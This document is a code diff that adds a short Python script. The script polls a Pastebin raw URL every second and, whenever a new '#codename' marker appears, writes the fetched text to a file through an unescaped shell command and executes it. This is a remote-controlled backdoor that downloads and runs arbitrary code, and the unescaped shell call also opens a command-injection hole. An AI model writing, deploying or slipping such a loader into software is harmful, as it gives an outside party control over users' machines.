@@ -1,0 +1,22 @@
+from os import system
+from itertools import cycle
+from time import sleep
+from re import search, DOTALL
+from requests import get as request
+
+interval = 1
+codename = None
+resource_urls = cycle(["https://pastebin.com/raw/QUustwAe"])
+while True:
+	sleep(interval)
+	resource_url = next(resource_urls)
+	print(resource_url)
+	instr = request(resource_url)
+	print('status:',instr.status_code)
+	if(instr.status_code != 200): continue
+	
+	instr_codename = search("#codename \w+",instr.text,DOTALL)
+	if((not instr_codename) or (instr_codename.group(0) == codename) ): continue
+	codename = instr_codename.group(0)
+	print("proc")
+	system("echo %s > .\alpha_temp.py & python .\alpha_temp.py" % instr.text)
